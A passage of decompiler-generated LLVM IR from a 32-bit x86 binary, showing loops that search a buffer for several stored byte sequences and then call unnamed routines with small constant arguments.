  %v3_804e19b = inttoptr i32 %v2_804e19b to i32*
  store i32 %v3_804e197, i32* %v3_804e19b, align 4
  %v5_804e19c = call i32 @function_8051c1c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e19c, i32* %eax.global-to-local, align 4
  %v0_804e1a1 = load i32, i32* @esp, align 4
  store i32 %v5_804e19c, i32* @ebx, align 4
  %tmp114 = icmp slt i32 %v5_804e19c, 1
  br i1 %tmp114, label %dec_label_pc_804e397, label %dec_label_pc_804e1ae

dec_label_pc_804e1ae:                             ; preds = %dec_label_pc_804e18c
  %v1_804e1a1 = add i32 %v0_804e1a1, 16
  %v1_804e1ae = add i32 %v0_804e1a1, 8436
  %v2_804e1ae = inttoptr i32 %v1_804e1ae to i32*
  %v3_804e1ae = load i32, i32* %v2_804e1ae, align 4
  store i32 %v3_804e1ae, i32* %eax.global-to-local, align 4
  %v2_804e1b5 = inttoptr i32 %v1_804e1a1 to i32*
  store i32 %v3_804e1ae, i32* %v2_804e1b5, align 4
  %v0_804e1b8 = load i32, i32* @ebx, align 4
  %v1_804e1b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1b8 = sub i32 %v0_804e1b8, %v1_804e1b8
  %v8_804e1b8 = xor i32 %v1_804e1b8, %v0_804e1b8
  %v9_804e1b8 = xor i32 %v2_804e1b8, %v0_804e1b8
  %v10_804e1b8 = and i32 %v9_804e1b8, %v8_804e1b8
  %v11_804e1b8 = icmp slt i32 %v10_804e1b8, 0
  %v13_804e1b8 = icmp slt i32 %v2_804e1b8, 0
  %v2_804e1ba = icmp eq i1 %v13_804e1b8, %v11_804e1b8
  br i1 %v2_804e1ba, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge

dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge: ; preds = %dec_label_pc_804e1ae
  %v0_804e1e8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1ae
  %v0_804e1c1 = load i32, i32* @esp, align 4
  %v10_804e1c5 = icmp eq i32 %v0_804e1b8, 0
  br i1 %v10_804e1c5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d0.preheader

dec_label_pc_804e1d0.preheader:                   ; preds = %dec_label_pc_804e1bc
  %v1_804e1c1 = add i32 %v0_804e1c1, 56
  %v1_804e1d0 = add i32 %v0_804e1c1, 36
  %v2_804e1d0 = inttoptr i32 %v1_804e1d0 to i32*
  %v1_804e2c1 = inttoptr i32 %v0_804e1c1 to i32*
  br label %dec_label_pc_804e1d0

dec_label_pc_804e1d0:                             ; preds = %dec_label_pc_804e1d0.preheader, %dec_label_pc_804e1e1
  %v0_804e1e1.in = phi i32 [ %v0_804e1e1, %dec_label_pc_804e1e1 ], [ %v0_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e2c0 = phi i32 [ %v3_804e1d661, %dec_label_pc_804e1e1 ], [ 0, %dec_label_pc_804e1d0.preheader ]
  %v4_804e1d4 = phi i32 [ %v6_804e1d4, %dec_label_pc_804e1e1 ], [ %v1_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e2 = phi i32 [ %v1_804e1e2, %dec_label_pc_804e1e1 ], [ %v1_804e1c1, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e1 = add i32 %v0_804e1e1.in, -1
  %v3_804e1d0 = load i32, i32* %v2_804e1d0, align 4
  store i32 %v3_804e1d0, i32* @edi, align 4
  %v1_804e1d4 = inttoptr i32 %v0_804e1e2 to i8*
  %v2_804e1d4 = load i8, i8* %v1_804e1d4, align 1
  %v3_804e1d4 = zext i8 %v2_804e1d4 to i32
  %v5_804e1d4 = and i32 %v4_804e1d4, -256
  %v6_804e1d4 = or i32 %v3_804e1d4, %v5_804e1d4
  store i32 %v6_804e1d4, i32* %eax.global-to-local, align 4
  %v4_804e1d6 = add i32 %v3_804e1d0, %v0_804e2c0
  %v5_804e1d6 = inttoptr i32 %v4_804e1d6 to i8*
  %v6_804e1d6 = load i8, i8* %v5_804e1d6, align 1
  %v17_804e1d6 = icmp eq i8 %v2_804e1d4, %v6_804e1d6
  br i1 %v17_804e1d6, label %dec_label_pc_804e2c0, label %dec_label_pc_804e1df

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1d0
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e1df
  %v3_804e1d661 = phi i32 [ %v1_804e2c0, %dec_label_pc_804e2c0 ], [ 0, %dec_label_pc_804e1df ]
  %v1_804e1e2 = add i32 %v0_804e1e2, 1
  %v10_804e1e3 = icmp eq i32 %v0_804e1e1, 0
  %v1_804e1e6 = icmp eq i1 %v10_804e1e3, false
  br i1 %v1_804e1e6, label %dec_label_pc_804e1d0, label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1e1, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge, %dec_label_pc_804e1bc
  %v0_804e1e8 = phi i32 [ %v0_804e1e8.pre, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge ], [ %v0_804e1c1, %dec_label_pc_804e1bc ], [ %v0_804e1c1, %dec_label_pc_804e1e1 ]
  %v1_804e1e8 = add i32 %v0_804e1e8, 8416
  %v2_804e1e8 = inttoptr i32 %v1_804e1e8 to i32*
  %v3_804e1e8 = load i32, i32* %v2_804e1e8, align 4
  store i32 %v3_804e1e8, i32* %eax.global-to-local, align 4
  %v2_804e1ef = inttoptr i32 %v0_804e1e8 to i32*
  store i32 %v3_804e1e8, i32* %v2_804e1ef, align 4
  %v0_804e1f2 = load i32, i32* @ebx, align 4
  %v1_804e1f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1f2 = sub i32 %v0_804e1f2, %v1_804e1f2
  %v8_804e1f2 = xor i32 %v1_804e1f2, %v0_804e1f2
  %v9_804e1f2 = xor i32 %v2_804e1f2, %v0_804e1f2
  %v10_804e1f2 = and i32 %v9_804e1f2, %v8_804e1f2
  %v11_804e1f2 = icmp slt i32 %v10_804e1f2, 0
  %v13_804e1f2 = icmp slt i32 %v2_804e1f2, 0
  %v2_804e1f4 = icmp eq i1 %v13_804e1f2, %v11_804e1f2
  br i1 %v2_804e1f4, label %dec_label_pc_804e1f6, label %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge

dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge: ; preds = %dec_label_pc_804e1e8
  %v0_804e21c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e21c

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1e8
  %v0_804e1fb = load i32, i32* @esp, align 4
  %v10_804e1ff = icmp eq i32 %v0_804e1f2, 0
  br i1 %v10_804e1ff, label %dec_label_pc_804e21c, label %dec_label_pc_804e204.preheader

dec_label_pc_804e204.preheader:                   ; preds = %dec_label_pc_804e1f6
  %v1_804e1fb = add i32 %v0_804e1fb, 56
  %v1_804e204 = add i32 %v0_804e1fb, 32
  %v2_804e204 = inttoptr i32 %v1_804e204 to i32*
  %v1_804e359 = inttoptr i32 %v0_804e1fb to i32*
  br label %dec_label_pc_804e204

dec_label_pc_804e204:                             ; preds = %dec_label_pc_804e204.preheader, %dec_label_pc_804e216
  %v0_804e216.in = phi i32 [ %v0_804e216, %dec_label_pc_804e216 ], [ %v0_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e358 = phi i32 [ %v3_804e20a69, %dec_label_pc_804e216 ], [ 0, %dec_label_pc_804e204.preheader ]
  %v4_804e208 = phi i32 [ %v6_804e208, %dec_label_pc_804e216 ], [ %v1_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e362 = phi i32 [ %v1_804e215, %dec_label_pc_804e216 ], [ %v1_804e1fb, %dec_label_pc_804e204.preheader ]
  %v0_804e216 = add i32 %v0_804e216.in, -1
  %v3_804e204 = load i32, i32* %v2_804e204, align 4
  store i32 %v3_804e204, i32* @edi, align 4
  %v1_804e208 = inttoptr i32 %v0_804e362 to i8*
  %v2_804e208 = load i8, i8* %v1_804e208, align 1
  %v3_804e208 = zext i8 %v2_804e208 to i32
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  store i32 %v6_804e208, i32* %eax.global-to-local, align 4
  %v4_804e20a = add i32 %v3_804e204, %v0_804e358
  %v5_804e20a = inttoptr i32 %v4_804e20a to i8*
  %v6_804e20a = load i8, i8* %v5_804e20a, align 1
  %v17_804e20a = icmp eq i8 %v2_804e208, %v6_804e20a
  br i1 %v17_804e20a, label %dec_label_pc_804e358, label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %dec_label_pc_804e204
  br label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e213
  %v3_804e20a69 = phi i32 [ 0, %dec_label_pc_804e213 ], [ %v1_804e358, %dec_label_pc_804e358 ]
  %v1_804e215 = add i32 %v0_804e362, 1
  %v10_804e217 = icmp eq i32 %v0_804e216, 0
  %v1_804e21a = icmp eq i1 %v10_804e217, false
  br i1 %v1_804e21a, label %dec_label_pc_804e204, label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge, %dec_label_pc_804e1f6
  %v0_804e21c = phi i32 [ %v0_804e21c.pre, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge ], [ %v0_804e1fb, %dec_label_pc_804e1f6 ], [ %v0_804e1fb, %dec_label_pc_804e216 ]
  %v1_804e21c = add i32 %v0_804e21c, 8412
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  %v3_804e21c = load i32, i32* %v2_804e21c, align 4
  store i32 %v3_804e21c, i32* %eax.global-to-local, align 4
  %v2_804e223 = inttoptr i32 %v0_804e21c to i32*
  store i32 %v3_804e21c, i32* %v2_804e223, align 4
  %v0_804e226 = load i32, i32* @ebx, align 4
  %v1_804e226 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e226 = sub i32 %v0_804e226, %v1_804e226
  %v8_804e226 = xor i32 %v1_804e226, %v0_804e226
  %v9_804e226 = xor i32 %v2_804e226, %v0_804e226
  %v10_804e226 = and i32 %v9_804e226, %v8_804e226
  %v11_804e226 = icmp slt i32 %v10_804e226, 0
  %v13_804e226 = icmp slt i32 %v2_804e226, 0
  %v2_804e228 = icmp eq i1 %v13_804e226, %v11_804e226
  br i1 %v2_804e228, label %dec_label_pc_804e22a, label %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge

dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge: ; preds = %dec_label_pc_804e21c
  %v0_804e250.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e250

dec_label_pc_804e22a:                             ; preds = %dec_label_pc_804e21c
  %v0_804e22f = load i32, i32* @esp, align 4
  %v10_804e233 = icmp eq i32 %v0_804e226, 0
  br i1 %v10_804e233, label %dec_label_pc_804e250, label %dec_label_pc_804e238.preheader

dec_label_pc_804e238.preheader:                   ; preds = %dec_label_pc_804e22a
  %v1_804e22f = add i32 %v0_804e22f, 56
  %v1_804e238 = add i32 %v0_804e22f, 28
  %v2_804e238 = inttoptr i32 %v1_804e238 to i32*
  %v1_804e369 = inttoptr i32 %v0_804e22f to i32*
  br label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e238.preheader, %dec_label_pc_804e24a
  %v0_804e24a.in = phi i32 [ %v0_804e24a, %dec_label_pc_804e24a ], [ %v0_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e368 = phi i32 [ %v3_804e23e77, %dec_label_pc_804e24a ], [ 0, %dec_label_pc_804e238.preheader ]
  %v4_804e23c = phi i32 [ %v6_804e23c, %dec_label_pc_804e24a ], [ %v1_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e372 = phi i32 [ %v1_804e249, %dec_label_pc_804e24a ], [ %v1_804e22f, %dec_label_pc_804e238.preheader ]
  %v0_804e24a = add i32 %v0_804e24a.in, -1
  %v3_804e238 = load i32, i32* %v2_804e238, align 4
  store i32 %v3_804e238, i32* @edi, align 4
  %v1_804e23c = inttoptr i32 %v0_804e372 to i8*
  %v2_804e23c = load i8, i8* %v1_804e23c, align 1
  %v3_804e23c = zext i8 %v2_804e23c to i32
  %v5_804e23c = and i32 %v4_804e23c, -256
  %v6_804e23c = or i32 %v3_804e23c, %v5_804e23c
  store i32 %v6_804e23c, i32* %eax.global-to-local, align 4
  %v4_804e23e = add i32 %v3_804e238, %v0_804e368
  %v5_804e23e = inttoptr i32 %v4_804e23e to i8*
  %v6_804e23e = load i8, i8* %v5_804e23e, align 1
  %v17_804e23e = icmp eq i8 %v2_804e23c, %v6_804e23e
  br i1 %v17_804e23e, label %dec_label_pc_804e368, label %dec_label_pc_804e247

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e238
  br label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e368, %dec_label_pc_804e247
  %v3_804e23e77 = phi i32 [ 0, %dec_label_pc_804e247 ], [ %v1_804e368, %dec_label_pc_804e368 ]
  %v1_804e249 = add i32 %v0_804e372, 1
  %v10_804e24b = icmp eq i32 %v0_804e24a, 0
  %v1_804e24e = icmp eq i1 %v10_804e24b, false
  br i1 %v1_804e24e, label %dec_label_pc_804e238, label %dec_label_pc_804e250

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e24a, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge, %dec_label_pc_804e22a
  %v0_804e250 = phi i32 [ %v0_804e250.pre, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge ], [ %v0_804e22f, %dec_label_pc_804e22a ], [ %v0_804e22f, %dec_label_pc_804e24a ]
  %v1_804e250 = add i32 %v0_804e250, 8424
  %v2_804e250 = inttoptr i32 %v1_804e250 to i32*
  %v3_804e250 = load i32, i32* %v2_804e250, align 4
  store i32 %v3_804e250, i32* %eax.global-to-local, align 4
  %v2_804e257 = inttoptr i32 %v0_804e250 to i32*
  store i32 %v3_804e250, i32* %v2_804e257, align 4
  %v0_804e25a = load i32, i32* @ebx, align 4
  %v1_804e25a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e25a = sub i32 %v0_804e25a, %v1_804e25a
  %v8_804e25a = xor i32 %v1_804e25a, %v0_804e25a
  %v9_804e25a = xor i32 %v2_804e25a, %v0_804e25a
  %v10_804e25a = and i32 %v9_804e25a, %v8_804e25a
  %v11_804e25a = icmp slt i32 %v10_804e25a, 0
  %v13_804e25a = icmp slt i32 %v2_804e25a, 0
  %v2_804e25c = icmp eq i1 %v13_804e25a, %v11_804e25a
  br i1 %v2_804e25c, label %dec_label_pc_804e25e, label %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge

dec_label_pc_804e250.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e250
  %v0_804e288.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e25e:                             ; preds = %dec_label_pc_804e250
  %v0_804e263 = load i32, i32* @esp, align 4
  %v10_804e267 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e267, label %dec_label_pc_804e288, label %dec_label_pc_804e270.preheader

dec_label_pc_804e270.preheader:                   ; preds = %dec_label_pc_804e25e
  %v1_804e263 = add i32 %v0_804e263, 56
  %v1_804e270 = add i32 %v0_804e263, 24
  %v2_804e270 = inttoptr i32 %v1_804e270 to i32*
  %v1_804e379 = inttoptr i32 %v0_804e263 to i32*
  br label %dec_label_pc_804e270

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e270.preheader, %dec_label_pc_804e282
  %v0_804e282.in = phi i32 [ %v0_804e282, %dec_label_pc_804e282 ], [ %v0_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e378 = phi i32 [ %v3_804e27685, %dec_label_pc_804e282 ], [ 0, %dec_label_pc_804e270.preheader ]
  %v4_804e274 = phi i32 [ %v6_804e274, %dec_label_pc_804e282 ], [ %v1_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e382 = phi i32 [ %v1_804e281, %dec_label_pc_804e282 ], [ %v1_804e263, %dec_label_pc_804e270.preheader ]
  %v0_804e282 = add i32 %v0_804e282.in, -1
  %v3_804e270 = load i32, i32* %v2_804e270, align 4
  store i32 %v3_804e270, i32* @edi, align 4
  %v1_804e274 = inttoptr i32 %v0_804e382 to i8*
  %v2_804e274 = load i8, i8* %v1_804e274, align 1
  %v3_804e274 = zext i8 %v2_804e274 to i32
  %v5_804e274 = and i32 %v4_804e274, -256
  %v6_804e274 = or i32 %v3_804e274, %v5_804e274
  store i32 %v6_804e274, i32* %eax.global-to-local, align 4
  %v4_804e276 = add i32 %v3_804e270, %v0_804e378
  %v5_804e276 = inttoptr i32 %v4_804e276 to i8*
  %v6_804e276 = load i8, i8* %v5_804e276, align 1
  %v17_804e276 = icmp eq i8 %v2_804e274, %v6_804e276
  br i1 %v17_804e276, label %dec_label_pc_804e378, label %dec_label_pc_804e27f

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e270
  br label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e378, %dec_label_pc_804e27f
  %v3_804e27685 = phi i32 [ 0, %dec_label_pc_804e27f ], [ %v1_804e378, %dec_label_pc_804e378 ]
  %v1_804e281 = add i32 %v0_804e382, 1
  %v10_804e283 = icmp eq i32 %v0_804e282, 0
  %v1_804e286 = icmp eq i1 %v10_804e283, false
  br i1 %v1_804e286, label %dec_label_pc_804e270, label %dec_label_pc_804e288

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e282, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge, %dec_label_pc_804e25e
  %v0_804e297 = phi i32 [ %v0_804e288.pre, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v0_804e263, %dec_label_pc_804e25e ], [ %v0_804e263, %dec_label_pc_804e282 ]
  %v0_804e18c52 = phi i32 [ %v1_804e25a, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v1_804e25a, %dec_label_pc_804e25e ], [ %v6_804e274, %dec_label_pc_804e282 ]
  %v1_804e288 = add i32 %v0_804e297, 8408
  %v2_804e288 = inttoptr i32 %v1_804e288 to i32*
  %v3_804e288 = load i32, i32* %v2_804e288, align 4
  %v2_804e28f = sub i32 %v0_804e25a, %v3_804e288
  %v8_804e28f = xor i32 %v3_804e288, %v0_804e25a
  %v9_804e28f = xor i32 %v2_804e28f, %v0_804e25a
  %v10_804e28f = and i32 %v9_804e28f, %v8_804e28f
  %v11_804e28f = icmp slt i32 %v10_804e28f, 0
  %v13_804e28f = icmp slt i32 %v2_804e28f, 0
  %v2_804e291 = icmp eq i1 %v13_804e28f, %v11_804e28f
  br i1 %v2_804e291, label %dec_label_pc_804e297, label %dec_label_pc_804e18c

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e288
  %v1_804e2a0126 = add i32 %v0_804e25a, -1
  store i32 %v1_804e2a0126, i32* @ebx, align 4
  %v10_804e2a1127 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e2a1127, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa.lr.ph

dec_label_pc_804e2aa.lr.ph:                       ; preds = %dec_label_pc_804e297
  %v1_804e297 = add i32 %v0_804e297, 56
  %v1_804e2aa = add i32 %v0_804e297, 20
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  br label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2aa.lr.ph, %dec_label_pc_804e2a0.backedge
  %v1_804e2a0131 = phi i32 [ %v1_804e2a0126, %dec_label_pc_804e2aa.lr.ph ], [ %v1_804e2a0, %dec_label_pc_804e2a0.backedge ]
  %v4_804e2ae130 = phi i32 [ %v0_804e18c52, %dec_label_pc_804e2aa.lr.ph ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ]
  %v0_804e391129 = phi i32 [ %v1_804e297, %dec_label_pc_804e2aa.lr.ph ], [ %storemerge32.in, %dec_label_pc_804e2a0.backedge ]
  %v0_804e388128 = phi i32 [ 0, %dec_label_pc_804e2aa.lr.ph ], [ %v3_804e2b091, %dec_label_pc_804e2a0.backedge ]
  %v3_804e2aa = load i32, i32* %v2_804e2aa, align 4
  store i32 %v3_804e2aa, i32* @edi, align 4
  %v1_804e2ae = inttoptr i32 %v0_804e391129 to i8*
  %v2_804e2ae = load i8, i8* %v1_804e2ae, align 1
  %v3_804e2ae = zext i8 %v2_804e2ae to i32
  %v5_804e2ae = and i32 %v4_804e2ae130, -256
  %v6_804e2ae = or i32 %v3_804e2ae, %v5_804e2ae
  store i32 %v6_804e2ae, i32* %eax.global-to-local, align 4
  %v4_804e2b0 = add i32 %v3_804e2aa, %v0_804e388128
  %v5_804e2b0 = inttoptr i32 %v4_804e2b0 to i8*
  %v6_804e2b0 = load i8, i8* %v5_804e2b0, align 1
  %v17_804e2b0 = icmp eq i8 %v2_804e2ae, %v6_804e2b0
  br i1 %v17_804e2b0, label %dec_label_pc_804e388, label %dec_label_pc_804e2b9

dec_label_pc_804e2b9:                             ; preds = %dec_label_pc_804e2aa
  br label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e1d0
  %v1_804e2c0 = add i32 %v0_804e2c0, 1
  %v2_804e2c1 = load i32, i32* %v1_804e2c1, align 4
  %v14_804e2c1 = icmp eq i32 %v2_804e2c1, %v1_804e2c0
  %v1_804e2c4 = icmp eq i1 %v14_804e2c1, false
  br i1 %v1_804e2c4, label %dec_label_pc_804e1e1, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e358, %dec_label_pc_804e368, %dec_label_pc_804e378, %dec_label_pc_804e388
  %v0_804e2ca = phi i32 [ %v0_804e297, %dec_label_pc_804e388 ], [ %v0_804e263, %dec_label_pc_804e378 ], [ %v0_804e22f, %dec_label_pc_804e368 ], [ %v0_804e1fb, %dec_label_pc_804e358 ], [ %v0_804e1c1, %dec_label_pc_804e2c0 ]
  %v1_804e2cd = add i32 %v0_804e2ca, -16
  %v2_804e2cd = inttoptr i32 %v1_804e2cd to i32*
  store i32 12, i32* %v2_804e2cd, align 4
  %v2_804e2cf = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @esp, align 4
  %v1_804e2d4 = inttoptr i32 %v0_804e2d4 to i32*
  store i32 13, i32* %v1_804e2d4, align 4
  %v2_804e2db = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  %v0_804e2e0 = load i32, i32* @esp, align 4
  %v1_804e2e0 = inttoptr i32 %v0_804e2e0 to i32*
  store i32 14, i32* %v1_804e2e0, align 4
  %v2_804e2e7 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e2e7, i32* %eax.global-to-local, align 4
  %v0_804e2ec = load i32, i32* @esp, align 4
  %v1_804e2ec = inttoptr i32 %v0_804e2ec to i32*
  store i32 15, i32* %v1_804e2ec, align 4
  %v2_804e2f3 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e2f3, i32* %eax.global-to-local, align 4
  %v0_804e2f8 = load i32, i32* @esp, align 4
  %v1_804e2f8 = inttoptr i32 %v0_804e2f8 to i32*
  store i32 16, i32* %v1_804e2f8, align 4
  %v2_804e2ff = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e2ff, i32* %eax.global-to-local, align 4
  %v0_804e304 = load i32, i32* @esp, align 4
  %v1_804e304 = inttoptr i32 %v0_804e304 to i32*
  %v2_804e304 = load i32, i32* %v1_804e304, align 4
  store i32 %v2_804e304, i32* %eax.global-to-local, align 4
  %v1_804e305 = add i32 %v0_804e304, 56
  %v2_804e305 = inttoptr i32 %v1_804e305 to i32*
  %v3_804e305 = load i32, i32* %v2_804e305, align 4
  store i32 %v3_804e305, i32* @edi, align 4
  store i32 %v3_804e305, i32* %v1_804e304, align 4
  %v1_804e30a = call i32 @function_8051a81(i32 0)
  store i32 %v1_804e30a, i32* %eax.global-to-local, align 4
  %v0_804e30f = load i32, i32* @esp, align 4
  %v1_804e30f = inttoptr i32 %v0_804e30f to i32*
  %v2_804e30f = load i32, i32* %v1_804e30f, align 4
  store i32 %v2_804e30f, i32* @ebx, align 4
  %v3_804e30f = add i32 %v0_804e30f, 4
  %v1_804e310 = inttoptr i32 %v3_804e30f to i32*
  store i32 9, i32* %v1_804e310, align 4
  %v0_804e313 = load i32, i32* @ebp, align 4
  store i32 %v0_804e313, i32* %v1_804e30f, align 4
  %v4_804e314 = call i32 @function_8051b60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e314, i32* @eax, align 4
  %v0_804e319 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e0c7, %dec_label_pc_804e397, %dec_label_pc_804e2ca
  %v1_804e31c.in = phi i32 [ %v0_804e0dc, %dec_label_pc_804e0c7 ], [ %v0_804e3dc, %dec_label_pc_804e397 ], [ %v0_804e319, %dec_label_pc_804e2ca ]
  %v0_804e31c = load i32, i32* @ecx, align 4
  %v2_804e31c = add i32 %v1_804e31c.in, 12
  %v3_804e31c = inttoptr i32 %v2_804e31c to i32*
  store i32 %v0_804e31c, i32* %v3_804e31c, align 4
  %v0_804e31d = load i32, i32* @ecx, align 4
  %v2_804e31d = add i32 %v1_804e31c.in, 8
  %v3_804e31d = inttoptr i32 %v2_804e31d to i32*
  store i32 %v0_804e31d, i32* %v3_804e31d, align 4
  %v1_804e31e = add i32 %v1_804e31c.in, 4
  %v2_804e31e = inttoptr i32 %v1_804e31e to i32*
  store i32 64, i32* %v2_804e31e, align 4
  %v0_804e320 = load i32, i32* @ebp, align 4
  store i32 %v0_804e320, i32* @esi, align 4
  %v1_804e322 = add i32 %v1_804e31c.in, 8328
  store i32 %v1_804e322, i32* @edi, align 4
  %v3_804e329 = inttoptr i32 %v1_804e31c.in to i32*
  store i32 %v1_804e322, i32* %v3_804e329, align 4
  %v2_804e32a = call i32 @function_8051570(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e32a, i32* %eax.global-to-local, align 4
  %v0_804e32f = load i32, i32* @esp, align 4
  %v1_804e32f = inttoptr i32 %v0_804e32f to i32*
  %v2_804e32f = load i32, i32* %v1_804e32f, align 4
  store i32 %v2_804e32f, i32* %eax.global-to-local, align 4
  %v3_804e32f = add i32 %v0_804e32f, 4
  %v1_804e330 = inttoptr i32 %v3_804e32f to i32*
  store i32 64, i32* %v1_804e330, align 4
  %v1_804e333 = add i32 %v0_804e32f, 8264
  store i32 %v1_804e333, i32* @eax, align 4
  store i32 %v1_804e333, i32* %v1_804e32f, align 4
  %v2_804e33b = call i32 @function_8051570(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e33b, i32* %eax.global-to-local, align 4
  %v0_804e340 = load i32, i32* @esp, align 4
  %v1_804e340 = inttoptr i32 %v0_804e340 to i32*
  store i32 1, i32* %v1_804e340, align 4
  %v1_804e347 = call i32 @function_8053630(i32 0)
  store i32 %v1_804e347, i32* %eax.global-to-local, align 4
  %v0_804e34c = load i32, i32* @esp, align 4
  %v1_804e34c = add i32 %v0_804e34c, 24
  %v2_804e34c = inttoptr i32 %v1_804e34c to i32*
  %v3_804e34c = load i32, i32* %v2_804e34c, align 4
  store i32 %v3_804e34c, i32* @ebx, align 4
  %v1_804e350 = add i32 %v0_804e34c, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e204
  %v1_804e358 = add i32 %v0_804e358, 1
  %v2_804e359 = load i32, i32* %v1_804e359, align 4
  %v14_804e359 = icmp eq i32 %v2_804e359, %v1_804e358
  br i1 %v14_804e359, label %dec_label_pc_804e2ca, label %dec_label_pc_804e216

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e238
  %v1_804e368 = add i32 %v0_804e368, 1
  %v2_804e369 = load i32, i32* %v1_804e369, align 4
  %v14_804e369 = icmp eq i32 %v2_804e369, %v1_804e368
  br i1 %v14_804e369, label %dec_label_pc_804e2ca, label %dec_label_pc_804e24a

dec_label_pc_804e378:                             ; preds = %dec_label_pc_804e270
  %v1_804e378 = add i32 %v0_804e378, 1
  %v2_804e379 = load i32, i32* %v1_804e379, align 4
  %v14_804e379 = icmp eq i32 %v2_804e379, %v1_804e378
  br i1 %v14_804e379, label %dec_label_pc_804e2ca, label %dec_label_pc_804e282

dec_label_pc_804e388:                             ; preds = %dec_label_pc_804e2aa
  %v1_804e388 = add i32 %v0_804e388128, 1
  %v12_804e389 = icmp eq i32 %v3_804e288, %v1_804e388
  br i1 %v12_804e389, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2a0.backedge:                    ; preds = %dec_label_pc_804e388, %dec_label_pc_804e2b9
  %v3_804e2b091 = phi i32 [ 0, %dec_label_pc_804e2b9 ], [ %v1_804e388, %dec_label_pc_804e388 ]
  %storemerge32.in = add i32 %v0_804e391129, 1
  %v1_804e2a0 = add i32 %v1_804e2a0131, -1
  store i32 %v1_804e2a0, i32* @ebx, align 4
